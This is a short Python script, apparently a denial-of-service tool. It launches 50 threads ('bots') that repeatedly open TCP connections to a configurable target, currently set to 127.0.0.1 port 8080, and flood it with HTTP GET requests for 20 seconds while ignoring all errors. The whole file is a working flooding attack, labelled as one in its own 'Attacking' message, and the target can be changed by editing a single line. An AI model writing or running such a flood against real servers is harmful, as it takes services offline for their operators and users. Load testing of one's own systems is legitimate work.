import threading
import socket
import time

TARGET_IP = '127.0.0.1'
TARGET_PORT = 8080
NUM_BOTS = 50

def send_requests():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((TARGET_IP, TARGET_PORT))
            s.sendall(b"GET / HTTP/1.1\r\nHost: localhost\r\n\r\n")
            s.close()
        except:
            pass

# Create bot threads
for i in range(NUM_BOTS):
    thread = threading.Thread(target=send_requests)
    thread.daemon = True
    thread.start()

print(f" Attacking {TARGET_IP}:{TARGET_PORT} with {NUM_BOTS} bots")
time.sleep(20)  # Let it run for 20 seconds
